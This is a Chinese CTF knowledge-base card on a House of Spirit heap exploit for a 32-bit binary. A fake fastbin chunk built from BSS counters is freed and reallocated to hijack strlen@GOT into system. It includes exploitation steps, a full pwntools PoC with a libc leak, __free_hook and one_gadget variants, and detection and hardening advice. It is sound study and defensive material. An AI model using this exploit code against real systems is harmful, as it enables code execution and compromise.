---
id: binary-pwn-heap-house-of-spirit-bss-counter-fake-chunk-strlen-got
title: House of Spirit：用 BSS 全局计数与指针拼出 0x40 假 fastbin chunk，free 后重新 malloc 覆盖 message 指针劫持 strlen GOT
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-spirit-bss-global-counter-fake-chunk-got-hijack
aliases:
- House of Spirit
- house_of_spirit
- 伪造 fastbin chunk
- BSS 假 chunk
- fake chunk 释放进 fastbin
- 全局计数器当 chunk size
- strlen GOT 改 system
tags:
- pwn
- heap
- house-of-spirit
- fastbin
- fake-chunk
- bss
- got-hijack
- strlen
- glibc
- 32bit
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V363
  verified_at: '2026-11-09T03:19:59+08:00'
  notes: 已对照原文与 8 张截图核对：add 计数 (0x804A2A4=0x40) 与 order 计数 (0x804A2A0=0) 拼出假 chunk 头、node point(+0x34) 被 name 覆盖为 0x804A2A8、message 从 0x804A2C0 写 0x20 零+p32(0x40)+p32(0x100) 构造下一 chunk、fastbin 0x40 头为 0x804a2a0（图 05/06/07）均与卡一致；Exp 与步骤的 add 次数(1+62+1=0x40) 和 original 一致。未验证点：原始 exp 未实际执行（卡片 confidence medium 已注明）；原文方法二 __free_hook+0x1000-0x10/one_gadget 0x3ac69 无运行结果，卡片已作为变体标注需按目标 libc 重核；No PIE/Partial RELRO 由固定 GOT 地址推断而非原文明说。
---

## 一句话结论

当程序能把一个指向可控内存的指针（链表 next/point 字段、回调指针、全局缓冲区等）直接交给 `free()`，且目标地址处能布置出通过 fastbin 校验的假 chunk 头时，`free()` 会把这个假块挂入 fastbin，下一次同尺寸 `malloc()` 就会把它返回给程序，从而获得对任意目标地址的受控写入——本题 32 位菜单题用 BSS 中相邻的 add/order 计数器拼出 `size=0x40` 的假 chunk，释放后重新申请回来覆盖 message 缓冲区指针为 `strlen@got`，再把 `strlen` GOT 改成 `system`，借 `system("...;/bin/sh")` 拿 shell。

## 原理

- **House of Spirit 的本质**：`free(ptr)` 只根据 `ptr` 前后固定偏移处的 chunk 头（32 位为 `ptr-8` 的 prev_size、`ptr-4` 的 size）判断如何释放，并不验证 `ptr` 是否真的来自 `malloc`。如果攻击者能让程序对一块自己布置过的内存调用 `free`，且该内存满足 fastbin 的释放校验，这块假 chunk 就会被挂进 fastbin；之后 `malloc` 相同 fastbin 下标时会把假 chunk 返回，形成“任意地址分配”。
- **fastbin 释放校验（32 位 glibc 2.23 语境）**：
  - 假 chunk 地址需满足 glibc 对齐（32 位 malloc 对齐为 8 字节，本题取 `0x804A2A0/0x804A2A8` 这类整齐地址）；
  - chunk size 的最低标志位不能带 `IS_MMAPPED`（mmap 块走单独释放路径）；
  - size 要落在 fastbin 范围（默认 `global_max_fast` 以内；32 位题目常用 0x40，64 位常用 0x70/0x80 以下）；
  - `free` 还会检查下一个 chunk（`ptr + size`）的 size：必须大于 `2*SIZE_SZ`（否则报 `free(): invalid next size (fast)`），且小于 `av->system_mem`（默认 135168）；本题把 next chunk 的 prev_size 写成假块的 size 0x40、自身 size 写成 0x100，从而顺利通过；
  - fastbin 链表头不能正好是该假块，否则触发 fastbin 的 double free 检查。
- **本题的 BSS 布局**：`0x804A2A0` 是 order 计数、`0x804A2A4` 是 add 计数、`0x804A2A8` 是 message 缓冲区指针（初值 `0x804A2C0`），缓冲区本体在 `0x804A2C0`。这三个全局变量天然拼出一个 chunk 头：`0x804A2A0` 的 order 计数当 prev_size（0），`0x804A2A4` 的 add 计数当 size；累计 add 满 0x40 次后，`0x804A2A4 == 0x40`，正好是一个合法 fastbin 假块的 size。
- **为什么能把假块交给 free**：每个 rifle 节点的 `point` 字段位于用户区 `+0x34`，指向链表上一个节点；add 的 name 写入起点是 `+0x19`、允许 56 字节，足以覆盖到 `+0x34`。把最后一个节点的 `point` 改成假块的用户指针 `0x804A2A8`，order 的遍历逻辑就会执行 `free(0x804A2A8)`；`free` 读 `0x804A2A4` 得到 size=0x40，把假块挂进 0x40 fastbin。
- **为什么需要先积累 add 次数**：假块的 size 字段就是 add 计数器，只有累计到 0x40 才能让 `free` 把它当成 0x40 的 fastbin 块；同时 order 遍历前会用 message 功能在 `0x804A2C0` 起写 0x20 字节零，把假块“下一个 chunk”（`0x804A2E0`）的 prev_size/size 设为 0x40/0x100，并顺带把假块用户区 `+0x34`（`0x804A2DC`）填 0，使释放后链表遍历在此结束。
- **重新申请与劫持**：`malloc(0x38)` 请求 0x40 的 chunk，从 fastbin 取到假块并返回 `0x804A2A8`；add 的 description 就写在 `0x804A2A8`，即覆盖 message 指针全局变量。把该指针改为 `strlen@got` 后调用 message，`fgets` 会把 `p32(system) + ";/bin/sh"` 写入 strlen GOT；随后程序对 `dword_804A2A8`（此时等于 strlen GOT 地址）调用 `strlen`，实际跳到 `system`。system 收到的字符串以 system 地址字节开头、以 `;` 分隔、以 `/bin/sh` 结尾，前置的无效命令失败后由 `;/bin/sh` 拉起 shell。
- **前置的 libc 泄露**：show 遍历链表时把每个节点的 `point` 当下一节点，并用 `%s` 打印 Description。把某个节点的 point 改成 `puts@got`，show 就会把 GOT 项内容当字符串打印，读到 puts 真实地址后即可算出 libc base（本题 No PIE + Partial RELRO，GOT 可写且地址固定）。

## 触发条件

- 程序存在“任意指针 free”或可由用户控制链表 next/回调指针并进入 `free` 的路径（本题是 order 遍历释放）。
- 目标指针指向的内存可被攻击者布置成合法 chunk：size 落在 fastbin 范围、下一个 chunk 的 size 合法、地址对齐。
- 可写全局变量布局恰好能拼出 chunk 头（如计数器紧邻指针/缓冲区），或存在可控的全局缓冲区可写入 size/next size。
- No PIE + Partial RELRO（GOT 可写且地址固定）时可直接劫持 GOT；否则需要先泄露地址或改打其他目标。
- 目标 glibc 的 fastbin 释放路径未加入更严格的校验（本题为 32 位 glibc 2.23 语境）。

## 利用步骤

1. **泄露 libc**：add 一个节点，name 写入 `'a'*27 + p32(puts@got)` 覆盖 `+0x34` 的 point；show 后链表会走到 puts GOT，从其 Description 读到 puts 地址，`libc_base = puts - libc.sym['puts']`。
2. **累计 add 计数**：继续 add 62 个节点（每个 point 置 0 结束链表），让 `0x804A2A4` 的 add 计数累计到 0x3f。
3. **最后一次 add 布置假块入口**：name 写 `'a'*27 + p32(0x804A2A8)`，使该节点 point 指向假块用户指针；这次 add 把计数推到 0x40，即假块 size。
4. **布置假块的下一个 chunk**：message 写入 `0x20 * '\x00' + p32(0x40) + p32(0x100)`，从 `0x804A2C0` 起填充，使 `0x804A2E0` 处 prev_size=0x40、size=0x100，同时把 `0x804A2DC` 置 0 终止释放遍历。
5. **触发 House of Spirit**：调用 order，链表遍历到最后一个节点时 `free(0x804A2A8)`，假块进入 0x40 fastbin。
6. **重新申请假块**：add 时 `malloc(0x38)` 返回 `0x804A2A8`；description 写 `p32(strlen@got).ljust(20,'a')`，覆盖 message 指针为 strlen GOT 地址。
7. **劫持 strlen 并 getshell**：message 写 `p32(system) + ';/bin/sh\x00'`，把 system 地址写入 strlen GOT；随后的 strlen 调用进入 system，`;` 后的 `/bin/sh` 被执行。

## PoC

```python
from pwn import *
context(os='linux', arch='i386')          # 32 位、No PIE、Partial RELRO
io = process('./pwn'); elf = ELF('./pwn'); libc = ELF('./libc.so.6')

def add(desc, name):
    io.sendline('1'); io.sendline(name); io.sendline(desc)
def show():
    io.sendline('2')
def order():
    io.sendline('3')
def message(content):
    io.sendline('4'); io.sendline(content)

# 1) 把节点 point 指向 puts@got，show 以 %s 打印 GOT 内容泄露 libc
add(b'a'*25, b'a'*27 + p32(elf.got['puts']))
show()
io.recvuntil('Description: ')
puts = u32(io.recv(4))
base = puts - libc.sym['puts']
system = base + libc.sym['system']

# 2) 累计 add 计数到 0x3f，最后一次 add 把计数推到 0x40 并让 point 指向假块
for _ in range(62):
    add(b'a'*25, b'a'*27 + p32(0))
add(b'a'*25, b'a'*27 + p32(0x804A2A8))

# 3) 假块下一个 chunk：prev_size=0x40, size=0x100（同时用 0x20 个零覆盖 0x804A2DC）
message(b'\x00'*0x20 + p32(0x40) + p32(0x100))

# 4) free(0x804A2A8) 把假块挂进 0x40 fastbin
order()

# 5) malloc(0x38) 返回假块，description 覆盖 message 指针为 strlen@got
add(p32(elf.got['strlen']).ljust(20, b'a'), b'b')

# 6) fgets 写入 strlen@got：system 地址 + ';/bin/sh'
message(p32(system) + b';/bin/sh\x00')
io.interactive()
```

关键 BSS 状态（gdb 观察）：`0x804A2A0: 0x00000000 0x00000040`（假块 prev_size/size），`0x804A2A8` 处的 message 指针被 free 改写成 fastbin 后继，`0x804A2E0: 0x00000040 0x00000100`（下一 chunk 头）；order 后 0x40 fastbin 头部即为 `0x804A2A0`。

## 变体与关联

- **改打 `__free_hook` + one_gadget（原文方法二）**：同样把假块申请回来后改写 message 指针到 `__free_hook` 附近，message 写入 one_gadget，再由 order 的 `free` 触发。原文给出的目标地址是 `libc_base + __free_hook + 0x1000 - 0x10`、one_gadget 偏移 `0x3ac69`，属于该题 libc/栈约束下的调整且未附运行结果，迁移时必须按目标 libc 重新核对。
- **其他收尾 sink**：`__malloc_hook`（旧版 glibc）、exit handler/FSOP、`_IO_list_all`、函数指针/回调指针；凡是“已知地址且会被调用”的写目标都可以接在 House of Spirit 的任意分配之后。
- **BSS 假块的其他来源**：可控全局 size 数组 + 指针数组（见 [[binary-pwn-heap-unsorted-bin-global-max-fast-bss-fake-fastbin-free-hook]]）、可控全局缓冲区直接写 chunk 头（见 [[binary-pwn-heap-abs-intmin-length-bypass-bss-fake-chunk-tcache-got]]，该卡是 tcache 版本）。
- **fastbin 入口的其他方式**：UAF 改 fastbin chunk 的 fd 指向假块（fastbin attack），与本卡直接 free 假块的区别在于是否需要一次真实释放。
- **关联**：[[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]（glibc 2.23 fastbin dup 打 hook 的另一种路径）。

## 检测与防御

- **检测特征**：fastbin 链表中出现指向 `.bss`/`.data`/非堆地址的块；`free` 的参数不是任何 `malloc` 返回值；chunk 头由全局计数器或相邻全局变量“凑巧”构成；GOT/函数指针在分配后立即被改写。
- **代码审计**：重点看“链表节点存 next 指针 + 遍历 free”“全局计数器紧邻指针/缓冲区”“name/description 等固定长度读取允许覆盖到 next 指针”三者的组合；free 前应校验指针来自堆管理器。
- **加固**：No PIE + Partial RELRO 会放大 GOT 劫持风险，应开启 PIE + Full RELRO；高版本 glibc 对对齐/双 free/tcache 的检查更多，但仍不能防住“布局本身合法”的假块；对释放指针做来源校验、free 后置空、避免把用户可控 size/指针放在一起。
- **运行时**：启用 `MALLOC_CHECK_`/glibc 加固、ASLR；对包含堆操作的服务进程用 malloc 调试与审计钩子监控异常 fastbin 链表。
